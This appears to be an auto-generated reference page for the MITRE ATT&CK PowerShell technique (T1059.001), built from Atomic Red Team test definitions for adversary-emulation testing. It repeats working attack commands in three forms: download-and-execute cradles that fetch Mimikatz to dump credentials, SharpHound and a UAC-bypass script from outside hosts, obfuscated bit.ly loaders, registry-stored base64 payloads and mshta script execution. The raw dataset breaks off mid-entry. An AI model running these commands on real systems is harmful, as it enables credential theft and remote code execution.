
# PowerShell

## Description

### MITRE Description

> Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1059/001

## Potential Commands

```
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
write-host "Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\T1059.001\src" -ForegroundColor Cyan
import-module PathToAtomicsFolder\T1059.001\src\SharpHound.ps1
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
New-PSSession -ComputerName $env:COMPUTERNAME
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe -version 2 -Command Write-Host $PSVersion
```

## Commands Dataset

```
[{'command': 'powershell.exe "IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); "
             'Invoke-Mimikatz -DumpCreds"\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': 'write-host "Import and Execution of SharpHound.ps1 from '
             'PathToAtomicsFolder\\T1059.001\\src" -ForegroundColor Cyan\n'
             'import-module '
             'PathToAtomicsFolder\\T1059.001\\src\\SharpHound.ps1\n'
             'Invoke-BloodHound -OutputDirectory $env:Temp\n'
             'Start-Sleep 5\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': 'write-host "Remote download of SharpHound.ps1 into memory, '
             'followed by execution of the script" -ForegroundColor Cyan\n'
             'IEX (New-Object '
             "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\n"
             'Invoke-BloodHound -OutputDirectory $env:Temp\n'
             'Start-Sleep 5\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': '(New-Object '
             "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n"
             '(New-Object '
             "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\n"
             "Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W "
             "'Net.WebClient';Set-Item Variable:\\gH "
             "'Default_File_Path.ps1';ls _-*;Set-Variable igZ "
             "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
             'Variable:0W).Value);Set-Variable J ((((Get-Variable igZ '
             "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ "
             '-ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item '
             'Variable:/HJ1).Value,(GV gH).Value);&( '
             "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
             '-Enco 3 (GV gH).Value)))\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
             '-ComObject '
             "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
             "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
             '$reg (Item Variable:_).Value[0] (Variable '
             '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
             'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
             '_).Value.MainWindowTitle})){Start-Sleep -Milliseconds '
             '500};While(!$wshell.AppActivate($title)){Start-Sleep '
             "-Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep "
             "-Milliseconds 500;@($url,(' "
             "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
             '_).Value)};$res=$Null;While($res.Length -lt '
             "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
             'Variable:_).Value)};Start-Sleep -Milliseconds '
             "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
             '_).Value)};If(GPS|?{(Item '
             "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
             "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
             '$reg (Item Variable:_).Value $props.((Variable '
             '_).Value)};IEX($res);invoke-mimikatz -dumpcr\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': 'Powershell.exe "IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); "
             'Invoke-AppPathBypass -Payload '
             '\'C:\\Windows\\System32\\cmd.exe\'"\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': 'powershell.exe -exec bypass -noprofile "$comMsXml=New-Object '
             '-ComObject '
             "MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX "
             '$comMsXml.ResponseText"\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
             '-exec bypass -noprofile "$Xml = (New-Object '
             "System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute "
             '| IEX"\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': 'C:\\Windows\\system32\\cmd.exe /c "mshta.exe '
             'javascript:a=GetObject(\'script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct\').Exec();close()"\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': '# Encoded payload in next command is the following "Set-Content '
             '-path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from '
             'the Atomic Red Team""\n'
             'reg.exe add '
             '"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" /v ART /t '
             'REG_SZ /d '
             '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="\n'
             'iex '
             '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
             "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': 'powershell.exe -version 2 -Command Write-Host $PSVersion\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host "
             '"Stream Data Executed"\' -Stream \'streamCommand\'\n'
             '$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt '
             "-Stream 'streamcommand'\n"
             'Invoke-Expression $streamcommand\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'},
 {'command': 'New-PSSession -ComputerName $env:COMPUTERNAME\n'
             'Test-Connection $env:COMPUTERNAME\n'
             'Set-Content -Path '
             '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value '
             '"T1086 PowerShell Session Creation and Use"\n'
             'Get-Content -Path '
             '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n'
             'Remove-Item -Force '
             '$env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n',
  'name': None,
  'source': 'atomics/T1059.001/T1059.001.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Command and Scripting Interpreter: PowerShell': {'atomic_tests': [{'auto_generated_guid': 'f3132740-55bc-48c4-bcc0-758a459cd027',
                                                                                             'description': 'Download '
                                                                                                            'Mimikatz '
                                                                                                            'and '
                                                                                                            'dump '
                                                                                                            'credentials. '
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            'mimikatz '
                                                                                                            'dump '
                                                                                                            'details '
                                                                                                            'and '
                                                                                                            'password '
                                                                                                            'hashes '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'displayed.\n',
                                                                                             'executor': {'command': 'powershell.exe '
                                                                                                                     '"IEX '
                                                                                                                     '(New-Object '
                                                                                                                     "Net.WebClient).DownloadString('#{mimurl}'); "
                                                                                                                     'Invoke-Mimikatz '
                                                                                                                     '-DumpCreds"\n',
                                                                                                          'elevation_required': True,
                                                                                                          'name': 'command_prompt'},
                                                                                             'input_arguments': {'mimurl': {'default': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1',
                                                                                                                            'description': 'Mimikatz '
                                                                                                                                           'url',
                                                                                                                            'type': 'url'}},
                                                                                             'name': 'Mimikatz',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': 'a21bb23e-e677-4ee7-af90-6931b57b6350',
                                                                                             'dependencies': [{'description': 'SharpHound.ps1 '
                                                                                                                              'must '
                                                                                                                              'be '
                                                                                                                              'located '
                                                                                                                              'at '
                                                                                                                              '#{file_path}\n',
                                                                                                               'get_prereq_command': 'Invoke-WebRequest '
                                                                                                                                     '"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" '
                                                                                                                                     '-OutFile '
                                                                                                                                     '"#{file_path}\\SharpHound.ps1"\n',
                                                                                                               'prereq_command': 'if '
                                                                                                                                 '(Test-Path '
                                                                                                                                 '#{file_path}\\SharpHound.ps1) '
                                                                                                                                 '{exit '
                                                                                                                                 '0} '
                                                                                                                                 'else '
                                                                                                                                 '{exit '
                                                                                                                                 '1}\n'}],
                                                                                             'dependency_executor_name': 'powershell',
                                                                                             'description': 'Upon '
                                                                                                            'execution '
                                                                                                            'SharpHound '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'downloaded '
                                                                                                            'to '
                                                                                                            'disk, '
                                                                                                            'imported '
                                                                                                            'and '
                                                                                                            'executed. '
                                                                                                            'It '
                                                                                                            'will '
                                                                                                            'set '
                                                                                                            'up '
                                                                                                            'collection '
                                                                                                            'methods, '
                                                                                                            'run '
                                                                                                            'and '
                                                                                                            'then '
                                                                                                            'compress '
                                                                                                            'and '
                                                                                                            'store '
                                                                                                            'the '
                                                                                                            'data '
                                                                                                            'to '
                                                                                                            'the '
                                                                                                            'temp '
                                                                                                            'directory '
                                                                                                            'on '
                                                                                                            'the '
                                                                                                            'machine. '
                                                                                                            'If '
                                                                                                            'system '
                                                                                                            'is '
                                                                                                            'unable '
                                                                                                            'to '
                                                                                                            'contact '
                                                                                                            'a '
                                                                                                            'domain, '
                                                                                                            'proper '
                                                                                                            'execution '
                                                                                                            'will '
                                                                                                            'not '
                                                                                                            'occur.\n'
                                                                                                            '\n'
                                                                                                            'Successful '
                                                                                                            'execution '
                                                                                                            'will '
                                                                                                            'produce '
                                                                                                            'stdout '
                                                                                                            'message '
                                                                                                            'stating '
                                                                                                            '"SharpHound '
                                                                                                            'Enumeration '
                                                                                                            'Completed". '
                                                                                                            'Upon '
                                                                                                            'completion, '
                                                                                                            'final '
                                                                                                            'output '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'a '
                                                                                                            '*BloodHound.zip '
                                                                                                            'file.\n',
                                                                                             'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                             '$env:Temp\\*BloodHound.zip '
                                                                                                                             '-Force\n',
                                                                                                          'command': 'write-host '
                                                                                                                     '"Import '
                                                                                                                     'and '
                                                                                                                     'Execution '
                                                                                                                     'of '
                                                                                                                     'SharpHound.ps1 '
                                                                                                                     'from '
                                                                                                                     '#{file_path}" '
                                                                                                                     '-ForegroundColor '
                                                                                                                     'Cyan\n'
                                                                                                                     'import-module '
                                                                                                                     '#{file_path}\\SharpHound.ps1\n'
                                                                                                                     'Invoke-BloodHound '
                                                                                                                     '-OutputDirectory '
                                                                                                                     '$env:Temp\n'
                                                                                                                     'Start-Sleep '
                                                                                                                     '5\n',
                                                                                                          'name': 'powershell'},
                                                                                             'input_arguments': {'file_path': {'default': 'PathToAtomicsFolder\\T1059.001\\src',
                                                                                                                               'description': 'File '
                                                                                                                                              'path '
                                                                                                                                              'for '
                                                                                                                                              'SharpHound '
                                                                                                                                              'payload',
                                                                                                                               'type': 'String'}},
                                                                                             'name': 'Run '
                                                                                                     'BloodHound '
                                                                                                     'from '
                                                                                                     'local '
                                                                                                     'disk',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': 'bf8c1441-4674-4dab-8e4e-39d93d08f9b7',
                                                                                             'description': 'Upon '
                                                                                                            'execution '
                                                                                                            'SharpHound '
                                                                                                            'will '
                                                                                                            'load '
                                                                                                            'into '
                                                                                                            'memory '
                                                                                                            'and '
                                                                                                            'execute '
                                                                                                            'against '
                                                                                                            'a '
                                                                                                            'domain. '
                                                                                                            'It '
                                                                                                            'will '
                                                                                                            'set '
                                                                                                            'up '
                                                                                                            'collection '
                                                                                                            'methods, '
                                                                                                            'run '
                                                                                                            'and '
                                                                                                            'then '
                                                                                                            'compress '
                                                                                                            'and '
                                                                                                            'store '
                                                                                                            'the '
                                                                                                            'data '
                                                                                                            'to '
                                                                                                            'the '
                                                                                                            'temp '
                                                                                                            'directory. '
                                                                                                            'If '
                                                                                                            'system '
                                                                                                            'is '
                                                                                                            'unable '
                                                                                                            'to '
                                                                                                            'contact '
                                                                                                            'a '
                                                                                                            'domain, '
                                                                                                            'proper '
                                                                                                            'execution '
                                                                                                            'will '
                                                                                                            'not '
                                                                                                            'occur.\n'
                                                                                                            '\n'
                                                                                                            'Successful '
                                                                                                            'execution '
                                                                                                            'will '
                                                                                                            'produce '
                                                                                                            'stdout '
                                                                                                            'message '
                                                                                                            'stating '
                                                                                                            '"SharpHound '
                                                                                                            'Enumeration '
                                                                                                            'Completed". '
                                                                                                            'Upon '
                                                                                                            'completion, '
                                                                                                            'final '
                                                                                                            'output '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'a '
                                                                                                            '*BloodHound.zip '
                                                                                                            'file.\n',
                                                                                             'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                             '$env:Temp\\*BloodHound.zip '
                                                                                                                             '-Force\n',
                                                                                                          'command': 'write-host '
                                                                                                                     '"Remote '
                                                                                                                     'download '
                                                                                                                     'of '
                                                                                                                     'SharpHound.ps1 '
                                                                                                                     'into '
                                                                                                                     'memory, '
                                                                                                                     'followed '
                                                                                                                     'by '
                                                                                                                     'execution '
                                                                                                                     'of '
                                                                                                                     'the '
                                                                                                                     'script" '
                                                                                                                     '-ForegroundColor '
                                                                                                                     'Cyan\n'
                                                                                                                     'IEX '
                                                                                                                     '(New-Object '
                                                                                                                     "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\n"
                                                                                                                     'Invoke-BloodHound '
                                                                                                                     '-OutputDirectory '
                                                                                                                     '$env:Temp\n'
                                                                                                                     'Start-Sleep '
                                                                                                                     '5\n',
                                                                                                          'name': 'powershell'},
                                                                                             'name': 'Run '
                                                                                                     'Bloodhound '
                                                                                                     'from '
                                                                                                     'Memory '
                                                                                                     'using '
                                                                                                     'Download '
                                                                                                     'Cradle',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '4297c41a-8168-4138-972d-01f3ee92c804',
                                                                                             'description': 'Different '
                                                                                                            'obfuscated '
                                                                                                            'methods '
                                                                                                            'to '
                                                                                                            'test. '
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            'reaches '
                                                                                                            'out '
                                                                                                            'to '
                                                                                                            'bit.ly/L3g1t '
                                                                                                            'and '
                                                                                                            'displays: '
                                                                                                            '"SUCCESSFULLY '
                                                                                                            'EXECUTED '
                                                                                                            'POWERSHELL '
                                                                                                            'CODE '
                                                                                                            'FROM '
                                                                                                            'REMOTE '
                                                                                                            'LOCATION"\n',
                                                                                             'executor': {'command': '(New-Object '
                                                                                                                     "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n"
                                                                                                                     '(New-Object '
                                                                                                                     "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\n"
                                                                                                                     'Set-Variable '
                                                                                                                     'HJ1 '
                                                                                                                     "'http://bit.ly/L3g1tCrad1e';SI "
                                                                                                                     'Variable:/0W '
                                                                                                                     "'Net.WebClient';Set-Item "
                                                                                                                     'Variable:\\gH '
                                                                                                                     "'Default_File_Path.ps1';ls "
                                                                                                                     '_-*;Set-Variable '
                                                                                                                     'igZ '
                                                                                                                     "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
                                                                                                                     'Variable:0W).Value);Set-Variable '
                                                                                                                     'J '
                                                                                                                     '((((Get-Variable '
                                                                                                                     'igZ '
                                                                                                                     "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable "
                                                                                                                     'igZ '
                                                                                                                     '-ValueOn).((ChildItem '
                                                                                                                     'Variable:J).Value).Invoke((Get-Item '
                                                                                                                     'Variable:/HJ1).Value,(GV '
                                                                                                                     'gH).Value);&( '
                                                                                                                     "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
                                                                                                                     '-Enco '
                                                                                                                     '3 '
                                                                                                                     '(GV '
                                                                                                                     'gH).Value)))\n',
                                                                                                          'name': 'powershell'},
                                                                                             'name': 'Obfuscation '
                                                                                                     'Tests',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': 'af1800cf-9f9d-4fd1-a709-14b1e6de020d',
                                                                                             'description': 'Run '
                                                                                                            'mimikatz '
                                                                                                            'via '
                                                                                                            'PsSendKeys. '
                                                                                                            'Upon '
                                                                                                            'execution, '
                                                                                                            'automated '
                                                                                                            'actions '
                                                                                                            'will '
                                                                                                            'take '
                                                                                                            'place '
                                                                                                            'to '
                                                                                                            'open '
                                                                                                            'file '
                                                                                                            'explorer, '
                                                                                                            'open '
                                                                                                            'notepad '
                                                                                                            'and '
                                                                                                            'input '
                                                                                                            'code, '
                                                                                                            'then '
                                                                                                            'mimikatz '
                                                                                                            'dump '
                                                                                                            'info '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'displayed.\n',
                                                                                             'executor': {'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
                                                                                                                     '-ComObject '
                                                                                                                     "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
                                                                                                                     "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
                                                                                                                     '$reg '
                                                                                                                     '(Item '
                                                                                                                     'Variable:_).Value[0] '
                                                                                                                     '(Variable '
                                                                                                                     '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
                                                                                                                     'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
                                                                                                                     '_).Value.MainWindowTitle})){Start-Sleep '
                                                                                                                     '-Milliseconds '
                                                                                                                     '500};While(!$wshell.AppActivate($title)){Start-Sleep '
                                                                                                                     '-Milliseconds '
                                                                                                                     "500};$wshell.SendKeys('^o');Start-Sleep "
                                                                                                                     '-Milliseconds '
                                                                                                                     "500;@($url,(' "
                                                                                                                     "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
                                                                                                                     '_).Value)};$res=$Null;While($res.Length '
                                                                                                                     '-lt '
                                                                                                                     "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
                                                                                                                     'Variable:_).Value)};Start-Sleep '
                                                                                                                     '-Milliseconds '
                                                                                                                     "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
                                                                                                                     '_).Value)};If(GPS|?{(Item '
                                                                                                                     "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
                                                                                                                     "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
                                                                                                                     '$reg '
                                                                                                                     '(Item '
                                                                                                                     'Variable:_).Value '
                                                                                                                     '$props.((Variable '
                                                                                                                     '_).Value)};IEX($res);invoke-mimikatz '
                                                                                                                     '-dumpcr\n',
                                                                                                          'elevation_required': True,
                                                                                                          'name': 'powershell'},
                                                                                             'name': 'Mimikatz '
                                                                                                     '- '
                                                                                                     'Cradlecraft '
                                                                                                     'PsSendKeys',
                                                                                             'supported_platforms': ['windows']},
                                                                                            {'auto_generated_guid': '06a220b6-7e29-4bd8-9d07-5b4d86742372',
                                                                                             'description': 'Note: '
                                                                                                            'Windows '
                                                                                                            '10 '
                                                                                                            'only. '
